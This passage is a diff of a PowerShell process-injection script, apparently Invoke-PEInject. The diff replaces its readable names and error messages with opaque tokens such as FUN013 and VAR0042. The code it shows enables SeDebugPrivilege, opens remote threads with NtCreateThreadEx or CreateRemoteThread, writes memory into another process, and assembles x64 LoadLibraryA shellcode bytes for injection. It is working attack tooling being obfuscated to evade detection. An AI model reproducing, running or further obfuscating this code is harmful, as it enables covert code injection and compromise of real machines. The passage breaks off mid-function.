+            $VAR011 = $VAR014.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+            $VAR0132 = $VAR011.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
+            $VAR0132.SetImplementationFlags('Runtime, Managed')
+            $VAR0133 = $VAR011.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
+            $VAR0133.SetImplementationFlags('Runtime, Managed')
 
-            Write-Output $TypeBuilder.CreateType()
+            Write-Output $VAR011.CreateType()
         }
 
 
         
-        Function Get-ProcAddress {
+        Function FUN012 {
             Param
             (
                 [OutputType([IntPtr])]
@@ -808,981 +792,981 @@ function Invoke-PEInject {
 
                 [Parameter( Position = 1, Mandatory = $True )]
                 [String]
-                $Procedure
+                $VAR0139
             )
 
             
-            $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
+            $VAR0134 = [AppDoFUN030]::CurrentDoFUN030.GetAssemblies() |
             Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
-            $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
+            $VAR0135 = $VAR0134.GetType('Microsoft.Win32.UnsafeNativeMethods')
 
             
-            $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
-            $GetProcAddress = $UnsafeNativeMethods.GetMethods() | Where { $_.Name -eq "GetProcAddress" } | Select-Object -first 1
+            $VAR0075 = $VAR0135.GetMethod('GetModuleHandle')
+            $VAR0060 = $VAR0135.GetMethods() | Where { $_.Name -eq "GetProcAddress" } | Select-Object -first 1
 
             
-            $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
+            $VAR0136 = $VAR0075.Invoke($null, @($Module))
 
             
             try {
-                $tmpPtr = New-Object IntPtr
-                $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
-                Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
+                $VAR0137 = New-Object IntPtr
+                $VAR0138 = New-Object System.Runtime.InteropServices.HandleRef($VAR0137, $VAR0136)
+                Write-Output $VAR0060.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$VAR0138, $VAR0139))
             }
             catch {
                 
-                Write-Output $GetProcAddress.Invoke($null, @($Kern32Handle, $Procedure))
+                Write-Output $VAR0060.Invoke($null, @($VAR0136, $VAR0139))
             }
         }
 
-        Function Enable-SeDebugPrivilege {
+        Function FUN013 {
             Param(
                 [Parameter(Position = 1, Mandatory = $true)]
                 [System.Object]
-                $Win32Functions,
+                $VAR0042,
 
                 [Parameter(Position = 2, Mandatory = $true)]
                 [System.Object]
-                $Win32Types,
+                $VAR010,
 
                 [Parameter(Position = 3, Mandatory = $true)]
                 [System.Object]
-                $Win32Constants
+                $VAR0041
             )
 
-            [IntPtr]$ThreadHandle = $Win32Functions.GetCurrentThread.Invoke()
-            if ($ThreadHandle -eq [IntPtr]::Zero) {
-                Throw "Unable to get the handle to the current thread"
+            [IntPtr]$VAR0141 = $VAR0042.FUN050.Invoke()
+            if ($VAR0141 -eq [IntPtr]::Zero) {
+                Throw "ERROR03"
             }
 
-            [IntPtr]$ThreadToken = [IntPtr]::Zero
-            [Bool]$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
-            if ($Result -eq $false) {
-                $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
-                if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN) {
-                    $Result = $Win32Functions.ImpersonateSelf.Invoke(3)
-                    if ($Result -eq $false) {
-                        Throw "Unable to impersonate self"
+            [IntPtr]$VAR0142 = [IntPtr]::Zero
+            [Bool]$VAR0144 = $VAR0042.FUN049.Invoke($VAR0141, $VAR0041.CONST026 -bor $VAR0041.CONST027, $false, [Ref]$VAR0142)
+            if ($VAR0144 -eq $false) {
+                $VAR0148 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
+                if ($VAR0148 -eq $VAR0041.CONST029) {
+                    $VAR0144 = $VAR0042.FUN053.Invoke(3)
+                    if ($VAR0144 -eq $false) {
+                        Throw "ERROR04"
                     }
 
-                    $Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
-                    if ($Result -eq $false) {
-                        Throw "Unable to OpenThreadToken."
+                    $VAR0144 = $VAR0042.FUN049.Invoke($VAR0141, $VAR0041.CONST026 -bor $VAR0041.CONST027, $false, [Ref]$VAR0142)
+                    if ($VAR0144 -eq $false) {
+                        Throw "ERROR05"
                     }
                 }
                 else {
-                    Throw "Unable to OpenThreadToken. Error code: $ErrorCode"
+                    Throw "ERROR06: $VAR0148"
                 }
             }
 
-            [IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))
-            $Result = $Win32Functions.LookupPrivilegeValue.Invoke($null, "SeDebugPrivilege", $PLuid)
-            if ($Result -eq $false) {
-                Throw "Unable to call LookupPrivilegeValue"
+            [IntPtr]$VAR0143 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$VAR010.CONST163))
+            $VAR0144 = $VAR0042.FUN052.Invoke($null, "SeDebugPrivilege", $VAR0143)
+            if ($VAR0144 -eq $false) {
+                Throw "ERROR07"
             }
 
-            [UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)
-            [IntPtr]$TokenPrivilegesMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
-            $TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, [Type]$Win32Types.TOKEN_PRIVILEGES)
-            $TokenPrivileges.PrivilegeCount = 1
-            $TokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$Win32Types.LUID)
-            $TokenPrivileges.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
-            [System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenPrivileges, $TokenPrivilegesMem, $true)
+            [UInt32]$VAR0145 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$VAR010.CONST167)
+            [IntPtr]$VAR0146 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($VAR0145)
+            $VAR0147 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0146, [Type]$VAR010.CONST167)
+            $VAR0147.CONST168 = 1
+            $VAR0147.CONST169.CONST163 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0143, [Type]$VAR010.CONST163)
+            $VAR0147.CONST169.Attributes = $VAR0041.CONST028
+            [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0147, $VAR0146, $true)
 
-            $Result = $Win32Functions.AdjustTokenPrivileges.Invoke($ThreadToken, $false, $TokenPrivilegesMem, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
-            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() 
-            if (($Result -eq $false) -or ($ErrorCode -ne 0)) {
+            $VAR0144 = $VAR0042.FUN051.Invoke($VAR0142, $false, $VAR0146, $VAR0145, [IntPtr]::Zero, [IntPtr]::Zero)
+            $VAR0148 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() 
+            if (($VAR0144 -eq $false) -or ($VAR0148 -ne 0)) {
                 
             }
 
-            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)
+            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($VAR0146)
         }
 
-        Function Create-RemoteThread {
+        Function FUN014 {
             Param(
                 [Parameter(Position = 1, Mandatory = $true)]
                 [IntPtr]
-                $ProcessHandle,
+                $VAR0151,
 
                 [Parameter(Position = 2, Mandatory = $true)]
                 [IntPtr]
-                $StartAddress,
+                $VAR0127,
 
                 [Parameter(Position = 3, Mandatory = $false)]
                 [IntPtr]
-                $ArgumentPtr = [IntPtr]::Zero,
+                $VAR0152 = [IntPtr]::Zero,
 
                 [Parameter(Position = 4, Mandatory = $true)]
                 [System.Object]
-                $Win32Functions
+                $VAR0042
             )
 
-            [IntPtr]$RemoteThreadHandle = [IntPtr]::Zero
+            [IntPtr]$VAR0149 = [IntPtr]::Zero
 
-            $OSVersion = [Environment]::OSVersion.Version
+            $VAR0150 = [Environment]::OSVersion.Version
             
-            if (($OSVersion -ge (New-Object 'Version' 6, 0)) -and ($OSVersion -lt (New-Object 'Version' 6, 2))) {
+            if (($VAR0150 -ge (New-Object 'Version' 6, 0)) -and ($VAR0150 -lt (New-Object 'Version' 6, 2))) {
                 
-                $RetVal = $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, $ArgumentPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
-                $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
-                if ($RemoteThreadHandle -eq [IntPtr]::Zero) {
-                    Throw "Error in NtCreateThreadEx. Return value: $RetVal. LastError: $LastError"
+                $RetVal = $VAR0042.FUN054.Invoke([Ref]$VAR0149, 0x1FFFFF, [IntPtr]::Zero, $VAR0151, $VAR0127, $VAR0152, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
+                $VAR0153 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
+                if ($VAR0149 -eq [IntPtr]::Zero) {
+                    Throw "ERROR63: $RetVal. $VAR0153"
                 }
             }
             
             else {
                 
-                $RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
+                $VAR0149 = $VAR0042.FUN047.Invoke($VAR0151, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $VAR0127, $VAR0152, 0, [IntPtr]::Zero)
             }
 
-            if ($RemoteThreadHandle -eq [IntPtr]::Zero) {
-                Write-Error "Error creating remote thread, thread handle is null" -ErrorAction Stop
+            if ($VAR0149 -eq [IntPtr]::Zero) {
+                Write-Error "ERROR64" -ErrorAction Stop
             }
 
-            return $RemoteThreadHandle
+            return $VAR0149
         }
 
-        Function Get-ImageNtHeaders {
+        Function FUN015 {
             Param(
                 [Parameter(Position = 0, Mandatory = $true)]
                 [IntPtr]
-                $PEHandle,
+                $VAR0263,
 
                 [Parameter(Position = 1, Mandatory = $true)]
                 [System.Object]
-                $Win32Types
+                $VAR010
             )
 
-            $NtHeadersInfo = New-Object System.Object
+            $VAR0154 = New-Object System.Object
 
             
-            $dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, [Type]$Win32Types.IMAGE_DOS_HEADER)
+            $VAR0155 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0263, [Type]$VAR010.CONST123)
 
             
-            [IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEHandle) ([Int64][UInt64]$dosHeader.e_lfanew))
-            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr
-            $imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS64)
+            [IntPtr]$VAR0156 = [IntPtr](FUN005 ([Int64]$VAR0263) ([Int64][UInt64]$VAR0155.CONST141))
+            $VAR0154 | Add-Member -MemberType NoteProperty -Name CONST030 -Value $VAR0156
+            $VAR0157 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0156, [Type]$VAR010.CONST03164)
 
             
-            if ($imageNtHeaders64.Signature -ne 0x00004550) {
-                throw "Invalid IMAGE_NT_HEADER signature."
+            if ($VAR0157.Signature -ne 0x00004550) {
+                throw "ERROR65"
             }
 
-            if ($imageNtHeaders64.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC') {
-                $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders64
-                $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
+            if ($VAR0157.CONST122.Magic -eq 'CONST101') {
+                $VAR0154 | Add-Member -MemberType NoteProperty -Name CONST031 -Value $VAR0157
+                $VAR0154 | Add-Member -MemberType NoteProperty -Name CONST032 -Value $true
             }
             else {
-                $ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS32)
-                $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders32
-                $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
+                $VAR0158 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0156, [Type]$VAR010.CONST03132)
+                $VAR0154 | Add-Member -MemberType NoteProperty -Name CONST031 -Value $VAR0158
+                $VAR0154 | Add-Member -MemberType NoteProperty -Name CONST032 -Value $false
             }
 
-            return $NtHeadersInfo
+            return $VAR0154
         }
 
 
         
-        Function Get-PEBasicInfo {
+        Function FUN016 {
             Param(
                 [Parameter( Position = 0, Mandatory = $true )]
                 [Byte[]]
-                $PEBytes,
+                $VAR001,
 
                 [Parameter(Position = 1, Mandatory = $true)]
                 [System.Object]
-                $Win32Types
+                $VAR010
             )
 
-            $PEInfo = New-Object System.Object
+            $VAR0126 = New-Object System.Object
 
             
-            [IntPtr]$UnmanagedPEBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)
-            [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $UnmanagedPEBytes, $PEBytes.Length) | Out-Null
+            [IntPtr]$VAR0159 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($VAR001.Length)
+            [System.Runtime.InteropServices.Marshal]::Copy($VAR001, 0, $VAR0159, $VAR001.Length) | Out-Null
 
             
-            $NtHeadersInfo = Get-ImageNtHeaders -PEHandle $UnmanagedPEBytes -Win32Types $Win32Types
+            $VAR0154 = FUN015 -VAR0263 $VAR0159 -VAR010 $VAR010
 
             
-            $PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($NtHeadersInfo.PE64Bit)
-            $PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
-            $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
-            $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
-            $PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
+            $VAR0126 | Add-Member -MemberType NoteProperty -Name 'CONST032' -Value ($VAR0154.CONST032)
+            $VAR0126 | Add-Member -MemberType NoteProperty -Name 'VAR0196' -Value ($VAR0154.CONST031.CONST122.CONST058)
+            $VAR0126 | Add-Member -MemberType NoteProperty -Name 'CONST033' -Value ($VAR0154.CONST031.CONST122.CONST033)
+            $VAR0126 | Add-Member -MemberType NoteProperty -Name 'CONST034' -Value ($VAR0154.CONST031.CONST122.CONST034)
+            $VAR0126 | Add-Member -MemberType NoteProperty -Name 'CONST035' -Value ($VAR0154.CONST031.CONST122.CONST035)
 
             
-            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedPEBytes)
+            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($VAR0159)
 
-            return $PEInfo
+            return $VAR0126
         }
 
 
         
         
-        Function Get-PEDetailedInfo {
+        Function FUN017 {
             Param(
                 [Parameter( Position = 0, Mandatory = $true)]
                 [IntPtr]
-                $PEHandle,
+                $VAR0263,
 
                 [Parameter(Position = 1, Mandatory = $true)]
                 [System.Object]
-                $Win32Types,
+                $VAR010,
 
                 [Parameter(Position = 2, Mandatory = $true)]
                 [System.Object]
-                $Win32Constants
+                $VAR0041
             )
 
-            if ($PEHandle -eq $null -or $PEHandle -eq [IntPtr]::Zero) {
-                throw 'PEHandle is null or IntPtr.Zero'
+            if ($VAR0263 -eq $null -or $VAR0263 -eq [IntPtr]::Zero) {
+                throw 'ERROR66'
             }
 
-            $PEInfo = New-Object System.Object
-
-            
-            $NtHeadersInfo = Get-ImageNtHeaders -PEHandle $PEHandle -Win32Types $Win32Types
+            $VAR0126 = New-Object System.Object
 
             
-            $PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $PEHandle
-            $PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($NtHeadersInfo.IMAGE_NT_HEADERS)
-            $PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($NtHeadersInfo.NtHeadersPtr)
-            $PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($NtHeadersInfo.PE64Bit)
-            $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
+            $VAR0154 = FUN015 -VAR0263 $VAR0263 -VAR010 $VAR010
 
-            if ($PEInfo.PE64Bit -eq $true) {
-                [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
-                $PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
+            
+            $VAR0126 | Add-Member -MemberType NoteProperty -Name VAR0263 -Value $VAR0263
+            $VAR0126 | Add-Member -MemberType NoteProperty -Name CONST031 -Value ($VAR0154.CONST031)
+            $VAR0126 | Add-Member -MemberType NoteProperty -Name CONST100 -Value ($VAR0154.CONST100)
+            $VAR0126 | Add-Member -MemberType NoteProperty -Name CONST032 -Value ($VAR0154.CONST032)
+            $VAR0126 | Add-Member -MemberType NoteProperty -Name 'CONST033' -Value ($VAR0154.CONST031.CONST122.CONST033)
+
+            if ($VAR0126.CONST032 -eq $true) {
+                [IntPtr]$VAR0160 = [IntPtr](FUN005 ([Int64]$VAR0126.CONST100) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$VAR010.CONST03164)))
+                $VAR0126 | Add-Member -MemberType NoteProperty -Name CONST036 -Value $VAR0160
             }
             else {
-                [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))
-                $PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
+                [IntPtr]$VAR0160 = [IntPtr](FUN005 ([Int64]$VAR0126.CONST100) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$VAR010.CONST03132)))
+                $VAR0126 | Add-Member -MemberType NoteProperty -Name CONST036 -Value $VAR0160
             }
 
-            if (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL) {
-                $PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
+            if (($VAR0154.CONST031.CONST121.CONST067 -band $VAR0041.CONST022) -eq $VAR0041.CONST022) {
+                $VAR0126 | Add-Member -MemberType NoteProperty -Name CONST037 -Value 'Library'
             }
-            elseif (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) {
-                $PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
+            elseif (($VAR0154.CONST031.CONST121.CONST067 -band $VAR0041.CONST021) -eq $VAR0041.CONST021) {
+                $VAR0126 | Add-Member -MemberType NoteProperty -Name CONST037 -Value 'Executable'
             }
             else {
-                Throw "PE file is not an EXE or DLL"
+                Throw "ERROR08"
             }
 
-            return $PEInfo
+            return $VAR0126
         }
 
-        Function Import-DllInRemoteProcess {
+        Function FUN018 {
             Param(
                 [Parameter(Position = 0, Mandatory = $true)]
                 [IntPtr]
-                $RemoteProcHandle,
+                $VAR0161,
 
                 [Parameter(Position = 1, Mandatory = $true)]
                 [IntPtr]
-                $ImportDllPathPtr
+                $VAR0162
             )
 
-            $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
+            $VAR0163 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
 
-            $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
-            $DllPathSize = [UIntPtr][UInt64]([UInt64]$ImportDllPath.Length + 1)
-            $RImportDllPathPtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
-            if ($RImportDllPathPtr -eq [IntPtr]::Zero) {
-                Throw "Unable to allocate memory in the remote process"
+            $VAR0164 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($VAR0162)
+            $VAR0165 = [UIntPtr][UInt64]([UInt64]$VAR0164.Length + 1)
+            $VAR0166 = $VAR0042.FUN032.Invoke($VAR0161, [IntPtr]::Zero, $VAR0165, $VAR0041.CONST001 -bor $VAR0041.CONST002, $VAR0041.CONST005)
+            if ($VAR0166 -eq [IntPtr]::Zero) {
+                Throw "ERROR09"
             }
 
-            [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
-            $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RImportDllPathPtr, $ImportDllPathPtr, $DllPathSize, [Ref]$NumBytesWritten)
+            [UIntPtr]$VAR0167 = [UIntPtr]::Zero
+            $Success = $VAR0042.FUN045.Invoke($VAR0161, $VAR0166, $VAR0162, $VAR0165, [Ref]$VAR0167)
 
             if ($Success -eq $false) {
-                Throw "Unable to write DLL path to remote process memory"
+                Throw "ERROR10"
             }
-            if ($DllPathSize -ne $NumBytesWritten) {
-                Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
+            if ($VAR0165 -ne $VAR0167) {
+                Throw "ERROR11"
             }
 
-            $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
-            $LoadLibraryAAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "LoadLibraryA") 
+            $VAR0168 = $VAR0042.FUN041.Invoke("kernel32.dll")
+            $VAR0169 = $VAR0042.FUN036.Invoke($VAR0168, "LoadLibraryA") 
 
-            [IntPtr]$DllAddress = [IntPtr]::Zero
+            [IntPtr]$VAR0181 = [IntPtr]::Zero
             
             
-            if ($PEInfo.PE64Bit -eq $true) {
+            if ($VAR0126.CONST032 -eq $true) {
                 
-                $LoadLibraryARetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
-                if ($LoadLibraryARetMem -eq [IntPtr]::Zero) {
-                    Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
-                }
-
-                
-                $LoadLibrarySC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
-                $LoadLibrarySC2 = @(0x48, 0xba)
-                $LoadLibrarySC3 = @(0xff, 0xd2, 0x48, 0xba)
-                $LoadLibrarySC4 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
-
-                $SCLength = $LoadLibrarySC1.Length + $LoadLibrarySC2.Length + $LoadLibrarySC3.Length + $LoadLibrarySC4.Length + ($PtrSize * 3)
-                $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
-                $SCPSMemOriginal = $SCPSMem
-
-                Write-BytesToMemory -Bytes $LoadLibrarySC1 -MemoryAddress $SCPSMem
-                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC1.Length)
-                [System.Runtime.InteropServices.Marshal]::StructureToPtr($RImportDllPathPtr, $SCPSMem, $false)
-                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
-                Write-BytesToMemory -Bytes $LoadLibrarySC2 -MemoryAddress $SCPSMem
-                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC2.Length)
-                [System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryAAddr, $SCPSMem, $false)
-                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
-                Write-BytesToMemory -Bytes $LoadLibrarySC3 -MemoryAddress $SCPSMem
-                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC3.Length)
-                [System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryARetMem, $SCPSMem, $false)
-                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
-                Write-BytesToMemory -Bytes $LoadLibrarySC4 -MemoryAddress $SCPSMem
-                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC4.Length)
-
-                $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
-                if ($RSCAddr -eq [IntPtr]::Zero) {
-                    Throw "Unable to allocate memory in the remote process for shellcode"
-                }
-
-                $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
-                if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength)) {
-                    Throw "Unable to write shellcode to remote process memory."
-                }
-
-                $RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
-                $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
-                if ($Result -ne 0) {
-                    Throw "Call to CreateRemoteThread to call GetProcAddress failed."
+                $VAR0170 = $VAR0042.FUN032.Invoke($VAR0161, [IntPtr]::Zero, $VAR0165, $VAR0041.CONST001 -bor $VAR0041.CONST002, $VAR0041.CONST005)
+                if ($VAR0170 -eq [IntPtr]::Zero) {
+                    Throw "ERROR12"
                 }
 
                 
-                [IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
-                $Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $LoadLibraryARetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
-                if ($Result -eq $false) {
-                    Throw "Call to ReadProcessMemory failed"
-                }
-                [IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])
+                $VAR0174 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
+                $VAR0175 = @(0x48, 0xba)
+                $VAR0176 = @(0xff, 0xd2, 0x48, 0xba)
+                $VAR0177 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
 
-                $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $LoadLibraryARetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
-                $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
+                $VAR0171 = $VAR0174.Length + $VAR0175.Length + $VAR0176.Length + $VAR0177.Length + ($VAR0163 * 3)
+                $VAR0172 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($VAR0171)
+                $VAR0173 = $VAR0172
+
+                FUN010 -Bytes $VAR0174 -VAR0129 $VAR0172
+                $VAR0172 = FUN005 $VAR0172 ($VAR0174.Length)
+                [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0166, $VAR0172, $false)
+                $VAR0172 = FUN005 $VAR0172 ($VAR0163)
+                FUN010 -Bytes $VAR0175 -VAR0129 $VAR0172
+                $VAR0172 = FUN005 $VAR0172 ($VAR0175.Length)
+                [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0169, $VAR0172, $false)
+                $VAR0172 = FUN005 $VAR0172 ($VAR0163)
+                FUN010 -Bytes $VAR0176 -VAR0129 $VAR0172
+                $VAR0172 = FUN005 $VAR0172 ($VAR0176.Length)
